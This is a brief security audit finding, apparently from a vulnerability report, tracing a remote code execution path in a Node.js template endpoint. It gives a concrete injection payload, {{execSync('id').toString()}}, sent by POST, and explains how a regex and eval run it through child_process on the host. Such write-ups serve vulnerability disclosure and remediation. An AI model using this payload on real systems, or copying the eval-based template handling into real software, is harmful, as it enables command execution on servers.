findings.exploit_path:
1. Attacker sends POST /api/tools/template with Content-Type: application/json
2. Body contains {"template": "{{execSync('id').toString()}}"}
3. The regex /\{\{(.+?)\}\}/g captures the expression inside {{}}
4. eval('execSync(\'id\').toString()') is called in server scope
5. execSync is already imported from child_process, so it executes 'id' on the host
6. Output is returned in the HTTP response body

